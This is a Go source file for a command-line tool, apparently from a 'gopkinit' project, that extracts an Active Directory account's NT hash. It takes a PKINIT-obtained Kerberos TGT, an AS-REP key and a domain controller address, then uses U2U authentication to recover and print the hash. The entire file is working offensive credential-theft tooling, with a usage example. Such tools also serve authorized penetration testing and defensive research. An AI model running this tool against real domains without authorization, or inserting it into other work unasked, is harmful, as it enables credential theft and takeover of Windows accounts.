package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"os"

	"github.com/ineffectivecoder/gopkinit/pkg/u2u"
)

func main() {
	ccachePath := flag.String("ccache", "", "Path to ccache file containing PKINIT TGT")
	asrepKey := flag.String("key", "", "AS-REP encryption key from gettgtpkinit (hex)")
	dcIP := flag.String("dc-ip", "", "IP address of domain controller")
	verbose := flag.Bool("v", false, "Verbose output")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: %s [options]\n\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Extracts NT hash from PKINIT-obtained TGT using U2U authentication.\n\n")
		fmt.Fprintf(os.Stderr, "Options:\n")
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nExample:\n")
		fmt.Fprintf(os.Stderr, "  %s -ccache user.ccache -key <asrep-key> -dc-ip 10.0.0.1\n", os.Args[0])
	}

	flag.Parse()

	if *ccachePath == "" {
		log.Fatal("Error: -ccache is required")
	}
	if *asrepKey == "" {
		log.Fatal("Error: -key is required (AS-REP key from gettgtpkinit)")
	}
	if *dcIP == "" {
		log.Fatal("Error: -dc-ip is required")
	}

	keyBytes, err := hex.DecodeString(*asrepKey)
	if err != nil {
		log.Fatalf("Error: invalid key format (must be hex): %v", err)
	}

	if *verbose {
		log.Printf("Using ccache: %s", *ccachePath)
		log.Printf("KDC address: %s:88", *dcIP)
		log.Printf("AS-REP key length: %d bytes", len(keyBytes))
	}

	client, err := u2u.NewU2UClient(*ccachePath, *dcIP, keyBytes)
	if err != nil {
		log.Fatalf("Failed to initialize U2U client: %v", err)
	}

	if *verbose {
		log.Println("Sending U2U TGS-REQ...")
	}

	ntHash, err := client.GetNTHash()
	if err != nil {
		log.Fatalf("Failed to extract NT hash: %v", err)
	}

	fmt.Printf("Recovered NT Hash: %x\n", ntHash)
}
